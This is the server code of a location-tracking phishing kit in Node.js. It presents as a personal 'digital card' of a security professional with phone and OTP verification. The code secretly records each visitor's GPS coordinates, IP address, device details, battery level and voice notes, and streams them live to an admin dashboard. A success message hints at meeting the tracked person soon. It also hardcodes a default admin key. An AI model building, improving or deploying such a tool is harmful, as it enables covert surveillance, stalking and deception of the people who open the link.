const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_ACCESS_KEY = process.env.ADMIN_KEY || 'wasim0786';
const CONFIG_FILE = path.join(__dirname, 'site-config.json');

const DEFAULT_CONFIG = {
  profileName: 'Wasim Akram (Cyber Security Lead)',
  profileTitle: 'Head of Operations',
  profileBio: 'Passionate about cloud architecture, decentralized systems, and zero-trust security. Enter your phone number below and click connect to exchange contact card.',
  pageTitle: 'Wasim Akram (Cyber Security Lead) | Digital Card & Portfolio',
  profileImgUrl: 'profile.jpg',
  buttonText: 'Send Verification OTP',
  requirePhone: true,
  requireOtp: true,
  defaultCountry: '+91',
  themeColor: '#06b6d4',
  successTitle: '✨ Thank You For Sharing!',
  successMessage: 'Thank you for sharing location & number! Mujhe need tha ye cheez ka, aapse mulaqat bahut jaldi hoga bhai ❤️🤝'
};

function getSiteConfig() {
  if (fs.existsSync(CONFIG_FILE)) {
    try {
      return { ...DEFAULT_CONFIG, ...JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8')) };
    } catch (e) {}
  }
  return DEFAULT_CONFIG;
}

function saveSiteConfig(newConfig) {
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(newConfig, null, 2), 'utf-8');
}

// --------------------------------------------------------------------------
// Database Setup (SQLite with High-Resilience FileDB Fallback for Cloud Hosts)
// --------------------------------------------------------------------------
let db;

function initFileDb() {
  const LOCATIONS_FILE = path.join(__dirname, 'locations.json');
  function readLocations() {
    try {
      if (fs.existsSync(LOCATIONS_FILE)) {
        return JSON.parse(fs.readFileSync(LOCATIONS_FILE, 'utf-8'));
      }
    } catch (e) {}
    return [];
  }
  function writeLocations(data) {
    try {
      fs.writeFileSync(LOCATIONS_FILE, JSON.stringify(data, null, 2), 'utf-8');
    } catch (e) {
      console.error('FileDB write error:', e);
    }
  }

  db = {
    serialize: (cb) => { if (cb) cb(); },
    run: function (sql, params, cb) {
      if (typeof params === 'function') {
        cb = params;
        params = [];
      }
      params = params || [];
      const self = { lastID: 1 };
      try {
        const records = readLocations();
        if (/INSERT INTO locations/i.test(sql)) {
          const numericIds = records.map(r => Number(r.id)).filter(id => !isNaN(id) && id > 0);
          const nextId = numericIds.length > 0 ? Math.max(...numericIds) + 1 : 1;
          self.lastID = nextId;
          const [
            tag, phoneNumber, otpStatus, deviceModel, latitude, longitude, accuracy,
            altitude, speed, heading, clientIp, userAgent, screenResolution,
            batteryLevel, clientTimestamp
          ] = params;
          records.unshift({
            id: nextId,
            tag: tag || 'General',
            phoneNumber: phoneNumber || 'N/A',
            otpStatus: otpStatus || 'VERIFIED',
            deviceModel: deviceModel || 'Unknown Device',
            latitude: Number(latitude),
            longitude: Number(longitude),
            accuracy: accuracy !== undefined && accuracy !== null ? Number(accuracy) : null,
            altitude: altitude !== undefined ? altitude : null,
            speed: speed !== undefined ? speed : null,
            heading: heading !== undefined ? heading : null,
            clientIp: clientIp || '127.0.0.1',
            userAgent: userAgent || 'Unknown',
            screenResolution: screenResolution || 'N/A',
            batteryLevel: batteryLevel || 'N/A',
            clientTimestamp: clientTimestamp || new Date().toISOString(),
            createdAt: new Date().toISOString()
          });
          writeLocations(records);
        } else if (/DELETE FROM locations WHERE id = \?/i.test(sql)) {
          const deleteId = Number(params[0]);
          const updated = records.filter(r => r.id !== deleteId);
          writeLocations(updated);
        } else if (/DELETE FROM locations/i.test(sql)) {
          writeLocations([]);
        }
        if (cb) cb.call(self, null);
      } catch (err) {
        if (cb) cb.call(self, err);
      }
    },
    all: function (sql, params, cb) {
      if (typeof params === 'function') {
        cb = params;
        params = [];
      }
      try {
        const records = readLocations();
        if (cb) cb(null, records);
      } catch (err) {
        if (cb) cb(err, []);
      }
    }
  };
}

// Initialize high-performance persistent database (Pure JS, zero GLIBC/C++ issues)
initFileDb();
console.log('✅ Persistent Database active at:', path.join(__dirname, 'locations.json'));

// --------------------------------------------------------------------------
// User Queries & Questions Database (FileDB)
// --------------------------------------------------------------------------
const QUERIES_FILE = path.join(__dirname, 'queries.json');

function readQueries() {
  try {
    if (fs.existsSync(QUERIES_FILE)) {
      return JSON.parse(fs.readFileSync(QUERIES_FILE, 'utf-8'));
    }
  } catch (e) {
    console.error('FileDB readQueries error:', e);
  }
  return [];
}

function writeQueries(data) {
  try {
    fs.writeFileSync(QUERIES_FILE, JSON.stringify(data, null, 2), 'utf-8');
  } catch (e) {
    console.error('FileDB writeQueries error:', e);
  }
}

// Middleware
app.use(cors());
app.use(express.json({ limit: '25mb' }));
app.use(express.urlencoded({ extended: true, limit: '25mb' }));

// Dynamic Landing Page (Serves SSR-rendered index.html with 0ms flash of default data)
app.get('/', serveDynamicIndex);
app.get('/index.html', serveDynamicIndex);

app.use(express.static(path.join(__dirname, 'public'), { index: false }));

// --------------------------------------------------------------------------
// Real-Time Server-Sent Events (SSE) for Authorized Admin
// --------------------------------------------------------------------------
let sseClients = [];

function broadcastToAdmins(data) {
  const payload = `data: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach(client => client.res.write(payload));
}

// Admin Auth Middleware
function checkAdminAuth(req, res, next) {
  const token = req.headers['x-admin-key'] || req.query.adminKey;
  if (token && token === ADMIN_ACCESS_KEY) {
    return next();
  }
  return res.status(401).json({ success: false, error: 'Unauthorized: Invalid Admin Access Key' });
}

// SSE Stream endpoint for Authorized Admin
app.get('/api/admin/stream', (req, res) => {
  const token = req.query.adminKey;
  if (token !== ADMIN_ACCESS_KEY) {
    return res.status(401).send('Unauthorized');
  }

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  const clientId = Date.now();
  const newClient = { id: clientId, res };
  sseClients.push(newClient);

  // Send initial ping
  res.write(`data: ${JSON.stringify({ type: 'CONNECTED', message: 'SSE Stream active' })}\n\n`);

  req.on('close', () => {
    sseClients = sseClients.filter(c => c.id !== clientId);
  });
});

// --------------------------------------------------------------------------
// Real-Time OTP State & Endpoints
// --------------------------------------------------------------------------
const activeOtps = new Map();

// Endpoint to send real-time OTP
app.post('/api/otp/send', (req, res) => {
  const { phoneNumber, tag = 'General' } = req.body || {};

  if (!phoneNumber || phoneNumber.replace(/[^0-9]/g, '').length < 10) {
    return res.status(400).json({ success: false, error: 'Valid 10-digit mobile number required' });
  }

  // Generate 4-digit numeric OTP
  const code = Math.floor(1000 + Math.random() * 9000).toString();
  const expiresAt = Date.now() + 5 * 60 * 1000; // 5 min validity

  activeOtps.set(phoneNumber, {
    code,
    expiresAt,
    verified: false,
    attempts: 0
  });

  console.log(`📲 [Real-Time OTP Dispatched] Code: ${code} to ${phoneNumber} (Tag: ${tag})`);

  // Broadcast real-time OTP event to Authorized Admin Dashboard!
  broadcastToAdmins({
    type: 'OTP_SENT',
    phoneNumber,
    code,
    tag,
    timestamp: new Date().toISOString()
  });

  return res.json({
    success: true,
    message: `Verification code sent to ${phoneNumber}`,
    otpPreview: code // instant preview for seamless verification testing
  });
});

// Endpoint to verify real-time OTP
app.post('/api/otp/verify', (req, res) => {
  const { phoneNumber, otp } = req.body || {};

  if (!phoneNumber || !otp) {
    return res.status(400).json({ success: false, error: 'Phone number and verification code are required' });
  }

  const record = activeOtps.get(phoneNumber);

  if (!record) {
    return res.status(400).json({ success: false, error: 'No OTP requested for this number. Click Send OTP.' });
  }

  if (Date.now() > record.expiresAt) {
    activeOtps.delete(phoneNumber);
    return res.status(400).json({ success: false, error: 'OTP expired. Please request a new code.' });
  }

  if (record.code !== otp.trim()) {
    record.attempts = (record.attempts || 0) + 1;
    return res.status(400).json({ success: false, error: 'Incorrect verification code. Please check and retry.' });
  }

  // Mark verified
  record.verified = true;
  const token = 'vtok_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
  record.token = token;

  console.log(`✅ [Real-Time OTP Verified] Phone: ${phoneNumber}`);

  // Broadcast verification event to Admin!
  broadcastToAdmins({
    type: 'OTP_VERIFIED',
    phoneNumber,
    token,
    timestamp: new Date().toISOString()
  });

  return res.json({
    success: true,
    message: 'Mobile number verified successfully!',
    token
  });
});

// --------------------------------------------------------------------------
// Public 3rd-Person Ingestion Endpoint (POST /api/location)
// --------------------------------------------------------------------------
app.post('/api/location', (req, res) => {
  const {
    latitude,
    longitude,
    accuracy,
    altitude,
    speed,
    heading,
    timestamp,
    tag = 'General',
    phoneNumber = 'N/A',
    otpStatus = 'VERIFIED',
    deviceModel = 'Unknown Device',
    screenResolution = 'N/A',
    batteryLevel = 'N/A'
  } = req.body || {};

  if (latitude === undefined || longitude === undefined) {
    return res.status(400).json({ success: false, error: 'Missing coordinates' });
  }

  const currentConfig = getSiteConfig();
  if (currentConfig.requirePhone) {
    if (!phoneNumber || phoneNumber === 'N/A' || phoneNumber.trim().replace(/[^0-9]/g, '').length < 10) {
      return res.status(400).json({ success: false, error: 'Valid 10-digit mobile number is mandatory first' });
    }
  }

  const clientIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1')
    .replace('::ffff:', '');
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const clientTimestamp = timestamp || new Date().toISOString();

  const query = `
    INSERT INTO locations (
      tag, phoneNumber, otpStatus, deviceModel, latitude, longitude, accuracy, altitude, speed, heading, 
      clientIp, userAgent, screenResolution, batteryLevel, clientTimestamp
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `;

  const values = [
    tag,
    phoneNumber,
    otpStatus,
    deviceModel,
    Number(latitude),
    Number(longitude),
    accuracy ? Number(accuracy) : null,
    altitude !== undefined ? altitude : null,
    speed !== undefined ? speed : null,
    heading !== undefined ? heading : null,
    clientIp,
    userAgent,
    screenResolution,
    batteryLevel,
    clientTimestamp
  ];

  db.run(query, values, function (err) {
    if (err) {
      console.error('❌ DB Insert Error:', err.message);
      return res.status(500).json({ success: false, error: 'Database error' });
    }

    const insertedRecord = {
      id: this.lastID,
      tag,
      phoneNumber,
      otpStatus,
      deviceModel,
      latitude: Number(latitude),
      longitude: Number(longitude),
      accuracy: accuracy ? Number(accuracy) : null,
      clientIp,
      userAgent,
      screenResolution,
      batteryLevel,
      clientTimestamp,
      createdAt: new Date().toISOString()
    };

    console.log(`📡 [3rd-Person Captured] ID #${insertedRecord.id} | Tag: ${tag} | Phone: ${phoneNumber} | OTP: ${otpStatus} | Lat: ${latitude}, Lon: ${longitude} | IP: ${clientIp}`);

    // Broadcast instant real-time notification to all connected Authorized Admin dashboards!
    broadcastToAdmins({
      type: 'NEW_LOCATION',
      record: insertedRecord
    });

    // Clean neutral response for the 3rd person (doesn't expose other data)
    return res.status(200).json({
      success: true,
      message: 'Verified'
    });
  });
});

// --------------------------------------------------------------------------
// Public User Question / Voice Query Endpoint (POST /api/query)
// --------------------------------------------------------------------------
app.post('/api/query', (req, res) => {
  const { query, audioData, audioDuration, phoneNumber = 'N/A', tag = 'General Visitor' } = req.body || {};

  const cleanQuery = (query || '').trim();

  // Validate: At least text question or voice note must be provided
  if (!cleanQuery && !audioData) {
    return res.status(400).json({
      success: false,
      error: 'Kripya apna sawal likhein ya voice note record karein'
    });
  }

  let audioUrl = null;
  let parsedDuration = audioDuration ? Math.round(Number(audioDuration)) : null;

  // Process and save Voice Note if attached
  if (audioData) {
    try {
      const uploadsDir = path.join(__dirname, 'public', 'uploads');
      if (!fs.existsSync(uploadsDir)) {
        fs.mkdirSync(uploadsDir, { recursive: true });
      }

      let ext = 'webm';
      let base64String = audioData;

      const matches = audioData.match(/^data:audio\/([a-zA-Z0-9_\-+]+);base64,(.+)$/);
      if (matches) {
        const mimeSub = matches[1].toLowerCase();
        if (mimeSub.includes('mp4') || mimeSub.includes('m4a')) ext = 'mp4';
        else if (mimeSub.includes('ogg')) ext = 'ogg';
        else if (mimeSub.includes('wav')) ext = 'wav';
        else if (mimeSub.includes('aac')) ext = 'aac';
        else if (mimeSub.includes('mpeg') || mimeSub.includes('mp3')) ext = 'mp3';
        else ext = 'webm';
        base64String = matches[2];
      }

      const safeFilename = `voice_${Date.now()}_${Math.random().toString(36).substring(2, 7)}.${ext}`;
      const targetPath = path.join(uploadsDir, safeFilename);
      fs.writeFileSync(targetPath, Buffer.from(base64String, 'base64'));
      audioUrl = `/uploads/${safeFilename}`;
      console.log(`🎙️ [Voice Note Saved] File: ${safeFilename} (${Math.round(base64String.length * 0.75 / 1024)} KB)`);
    } catch (audioErr) {
      console.error('❌ Failed to save voice audio note:', audioErr);
    }
  }

  const clientIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1')
    .replace('::ffff:', '');
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const queries = readQueries();

  const numericIds = queries.map(q => Number(q.id)).filter(id => !isNaN(id) && id > 0);
  const nextId = numericIds.length > 0 ? Math.max(...numericIds) + 1 : 1;

  const newQuery = {
    id: nextId,
    query: cleanQuery,
    hasAudio: !!audioUrl,
    audioUrl: audioUrl || null,
    audioDuration: parsedDuration,
    phoneNumber: phoneNumber || 'N/A',
    tag: tag || 'General Visitor',
    clientIp,
    userAgent,
    createdAt: new Date().toISOString()
  };

  queries.unshift(newQuery);
  writeQueries(queries);

  console.log(`💬 [User Question Received] ID #${newQuery.id} | Phone: ${phoneNumber} | Tag: ${tag} | Voice: ${!!audioUrl} | Text: "${cleanQuery}"`);

  // Instant real-time broadcast to all connected Admin Dashboards!
  broadcastToAdmins({
    type: 'NEW_QUERY',
    query: newQuery
  });

  return res.status(200).json({
    success: true,
    message: 'Question / Voice Note sent successfully!',
    query: newQuery
  });
});

// --------------------------------------------------------------------------
// Authorized Admin Protected Endpoints
// --------------------------------------------------------------------------

// Verify Admin Key
app.post('/api/admin/verify', (req, res) => {
  const { key } = req.body || {};
  if (key === ADMIN_ACCESS_KEY) {
    return res.json({ success: true, message: 'Authenticated' });
  }
  return res.status(401).json({ success: false, error: 'Invalid key' });
});

// Get all locations from SQLite
app.get('/api/admin/locations', checkAdminAuth, (req, res) => {
  db.all('SELECT * FROM locations ORDER BY id DESC LIMIT 500', [], (err, rows) => {
    if (err) {
      return res.status(500).json({ success: false, error: err.message });
    }
    return res.json({
      success: true,
      count: rows.length,
      locations: rows
    });
  });
});

// Delete single record
app.delete('/api/admin/locations/:id', checkAdminAuth, (req, res) => {
  const id = req.params.id;
  db.run('DELETE FROM locations WHERE id = ?', [id], function (err) {
    if (err) {
      return res.status(500).json({ success: false, error: err.message });
    }
    broadcastToAdmins({ type: 'RECORD_DELETED', id: Number(id) });
    return res.json({ success: true, message: `Record #${id} deleted.` });
  });
});

// Clear all records
app.delete('/api/admin/locations', checkAdminAuth, (req, res) => {
  db.run('DELETE FROM locations', [], function (err) {
    if (err) {
      return res.status(500).json({ success: false, error: err.message });
    }
    broadcastToAdmins({ type: 'ALL_CLEARED' });
    return res.json({ success: true, message: 'All records cleared.' });
  });
});

// --------------------------------------------------------------------------
// Admin Queries Management Endpoints
// --------------------------------------------------------------------------
// Get all user queries
app.get('/api/admin/queries', checkAdminAuth, (req, res) => {
  const queries = readQueries();
  return res.json({
    success: true,
    count: queries.length,
    queries
  });
});

// Helper: Clean up saved audio note file if stored locally
function deleteAudioFileIfLocal(audioUrl) {
  if (!audioUrl || typeof audioUrl !== 'string') return;
  try {
    if (audioUrl.startsWith('/uploads/voice_')) {
      const filename = path.basename(audioUrl);
      const filePath = path.join(__dirname, 'public', 'uploads', filename);
      if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
        console.log(`🗑️ [Voice Note Cleaned] Deleted file: ${filename}`);
      }
    }
  } catch (e) {
    console.error('Error cleaning audio file:', e);
  }
}

// Delete single query
app.delete('/api/admin/queries/:id', checkAdminAuth, (req, res) => {
  const id = Number(req.params.id);
  const queries = readQueries();
  const toDelete = queries.find(q => q.id === id);
  if (toDelete && toDelete.audioUrl) {
    deleteAudioFileIfLocal(toDelete.audioUrl);
  }
  const updated = queries.filter(q => q.id !== id);
  writeQueries(updated);
  broadcastToAdmins({ type: 'QUERY_DELETED', id });
  return res.json({ success: true, message: `Query #${id} deleted.` });
});

// Clear all queries
app.delete('/api/admin/queries', checkAdminAuth, (req, res) => {
  const queries = readQueries();
  queries.forEach(q => {
    if (q.audioUrl) deleteAudioFileIfLocal(q.audioUrl);
  });
  writeQueries([]);
  broadcastToAdmins({ type: 'ALL_QUERIES_CLEARED' });
  return res.json({ success: true, message: 'All queries cleared.' });
});

// --------------------------------------------------------------------------
// Live Frontend Customization Endpoints (Full Control Access)
// --------------------------------------------------------------------------
app.get('/api/config', (req, res) => {
  res.json({ success: true, config: getSiteConfig() });
});

app.post('/api/admin/config', checkAdminAuth, (req, res) => {
  const current = getSiteConfig();
  const updated = { ...current, ...req.body, updatedAt: Date.now() };
  saveSiteConfig(updated);
  broadcastToAdmins({ type: 'CONFIG_UPDATED', config: updated });
  console.log(`🎨 [UI Config Updated by Admin] Name: ${updated.profileName} | OTP: ${updated.requireOtp}`);
  return res.json({ success: true, message: 'Frontend UI settings updated successfully!', config: updated });
});

// Upload DP / Profile Picture Endpoint
app.post('/api/admin/upload-dp', checkAdminAuth, (req, res) => {
  try {
    const { imageData } = req.body;
    if (!imageData) {
      return res.status(400).json({ success: false, error: 'No image data provided' });
    }

    const uploadsDir = path.join(__dirname, 'public', 'uploads');
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
    }

    // Determine extension and buffer
    let ext = 'jpg';
    let buffer;

    const matches = imageData.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
    if (matches && matches.length === 3) {
      const mime = matches[1].toLowerCase();
      if (mime.includes('png')) ext = 'png';
      else if (mime.includes('webp')) ext = 'webp';
      else if (mime.includes('gif')) ext = 'gif';
      else if (mime.includes('svg')) ext = 'svg';
      else if (mime.includes('jpeg') || mime.includes('jpg')) ext = 'jpg';
      buffer = Buffer.from(matches[2], 'base64');
    } else {
      buffer = Buffer.from(imageData, 'base64');
    }

    const safeFilename = `dp_${Date.now()}.${ext}`;
    const targetPath = path.join(uploadsDir, safeFilename);
    fs.writeFileSync(targetPath, buffer);

    const relativeUrl = `/uploads/${safeFilename}`;

    // Update site-config with cache-busting timestamp for social scrapers
    const current = getSiteConfig();
    current.profileImgUrl = relativeUrl;
    current.updatedAt = Date.now();
    saveSiteConfig(current);

    // Broadcast config update to all admin and frontend clients
    broadcastToAdmins({ type: 'CONFIG_UPDATED', config: current });
    console.log(`📸 [DP Uploaded Successfully] New DP URL: ${relativeUrl}`);

    return res.json({
      success: true,
      message: 'Profile picture uploaded and updated successfully!',
      imageUrl: relativeUrl,
      config: current
    });
  } catch (err) {
    console.error('❌ Failed to upload DP:', err);
    return res.status(500).json({ success: false, error: 'Server error saving image: ' + err.message });
  }
});

// --------------------------------------------------------------------------
// Dynamic SSR & Social Link Preview Handler (Instagram, FB, WhatsApp, Direct)
// Renders profile name, title, bio, photo directly in HTML (0ms flash of default data)
// --------------------------------------------------------------------------
function escapeHtmlMeta(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function serveDynamicIndex(req, res) {
  const indexPath = path.join(__dirname, 'public', 'index.html');
  fs.readFile(indexPath, 'utf-8', (err, html) => {
    if (err) {
      console.error('❌ Error reading index.html:', err);
      return res.status(500).send('Server Error');
    }

    const config = getSiteConfig();
    const forwardedProto = req.headers['x-forwarded-proto'];
    const protocol = (forwardedProto ? forwardedProto.split(',')[0].trim() : req.protocol) || 'http';
    const host = req.get('host') || `localhost:${PORT}`;
    const baseUrl = `${protocol}://${host}`;

    // Resolve full absolute URL for og:image (required by Instagram / Meta)
    let imageUrl = config.profileImgUrl || 'profile.jpg';
    if (!imageUrl.startsWith('http://') && !imageUrl.startsWith('https://')) {
      const cleanPath = imageUrl.startsWith('/') ? imageUrl : `/${imageUrl}`;
      imageUrl = `${baseUrl}${cleanPath}`;
    }

    // Determine MIME type
    let imageType = 'image/jpeg';
    if (imageUrl.toLowerCase().includes('.png')) imageType = 'image/png';
    else if (imageUrl.toLowerCase().includes('.webp')) imageType = 'image/webp';
    else if (imageUrl.toLowerCase().includes('.gif')) imageType = 'image/gif';

    // Append cache buster so platforms like Instagram don't serve stale cached images
    const cacheBuster = `v=${config.updatedAt || Date.now()}`;
    const fullImageUrl = imageUrl.includes('?') ? `${imageUrl}&${cacheBuster}` : `${imageUrl}?${cacheBuster}`;
    const fullPageUrl = `${baseUrl}${req.originalUrl.split('?')[0]}`;

    const profileName = config.profileName || 'Wasim Akram (Cyber Security Lead)';
    const profileTitle = config.profileTitle || '';
    const profileBio = config.profileBio || 'Passionate about cloud architecture, decentralized systems, and zero-trust security. Enter your phone number below and click connect to exchange contact card.';
    const profileImg = config.profileImgUrl || 'profile.jpg';
    const buttonText = config.buttonText || 'Send Verification OTP';
    const themeColor = config.themeColor || '#06b6d4';
    const phoneDisplay = config.requirePhone === false ? 'none' : 'block';
    const successTitle = config.successTitle || '✨ Thank You For Sharing!';
    const successMessage = config.successMessage || 'Thank you for sharing location & number! Mujhe need tha ye cheez ka, aapse mulaqat bahut jaldi hoga bhai ❤️🤝';

    const title = config.pageTitle || `${profileName} | Digital Card & Portfolio`;
    const description = profileBio || profileTitle || 'Official verified digital profile and portfolio.';

    // Safe JSON representation for client-side instant bootstrap
    const safeConfigJson = JSON.stringify(config).replace(/</g, '\\u003c');

    const rendered = html
      .replace(/{{PAGE_TITLE}}/g, escapeHtmlMeta(title))
      .replace(/{{PAGE_DESCRIPTION}}/g, escapeHtmlMeta(description))
      .replace(/{{OG_TITLE}}/g, escapeHtmlMeta(title))
      .replace(/{{OG_DESCRIPTION}}/g, escapeHtmlMeta(description))
      .replace(/{{OG_URL}}/g, fullPageUrl)
      .replace(/{{OG_IMAGE}}/g, fullImageUrl)
      .replace(/{{OG_IMAGE_TYPE}}/g, imageType)
      .replace(/{{INITIAL_CONFIG_JSON}}/g, safeConfigJson)
      .replace(/--accent-cyan:\s*#06b6d4;/g, `--accent-cyan: ${escapeHtmlMeta(themeColor)};`)
      .replace(/{{PROFILE_IMAGE}}/g, escapeHtmlMeta(profileImg))
      .replace(/{{PROFILE_NAME}}/g, escapeHtmlMeta(profileName))
      .replace(/{{PROFILE_TITLE}}/g, escapeHtmlMeta(profileTitle))
      .replace(/{{PROFILE_TITLE_STYLE}}/g, profileTitle && profileTitle.trim() ? '' : 'display: none;')
      .replace(/{{PROFILE_BIO}}/g, escapeHtmlMeta(profileBio))
      .replace(/{{PHONE_DISPLAY}}/g, phoneDisplay)
      .replace(/{{BUTTON_TEXT}}/g, escapeHtmlMeta(buttonText))
      .replace(/{{SUCCESS_TITLE}}/g, escapeHtmlMeta(successTitle))
      .replace(/{{SUCCESS_MESSAGE}}/g, escapeHtmlMeta(successMessage));

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    return res.send(rendered);
  });
}

// Routes
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Dynamic Root Page for Scrapers & Visitors
app.get('/', serveDynamicIndex);

// Catch-all for undefined /api routes (Always return JSON, never HTML!)
app.all('/api/*', (req, res) => {
  res.status(404).json({
    success: false,
    error: `API route not found: ${req.method} ${req.originalUrl}. Make sure the server has been restarted.`
  });
});

// Fallback for SPA routing while letting static assets pass through
app.get('*', (req, res, next) => {
  if (req.path.startsWith('/api') || req.path.includes('.')) {
    return next();
  }
  serveDynamicIndex(req, res);
});

// Global Error Handler for API & Server (Always return JSON for /api)
app.use((err, req, res, next) => {
  console.error('❌ Server/API Error:', err);
  if (req.path && req.path.startsWith('/api')) {
    return res.status(err.status || 500).json({
      success: false,
      error: err.message || 'Server Internal Error'
    });
  }
  res.status(500).send(`Server Error: ${err.message}`);
});

// Start Server
app.listen(PORT, () => {
  console.log(`\n======================================================`);
  console.log(`🚀 Location Tracker System Online`);
  console.log(`👉 3rd-Person Link (Public):    http://localhost:${PORT}/`);
  console.log(`🔐 Authorized Admin Dashboard: http://localhost:${PORT}/admin`);
  console.log(`🔑 Admin Access Key:           [PROTECTED]`);
  console.log(`======================================================\n`);
});
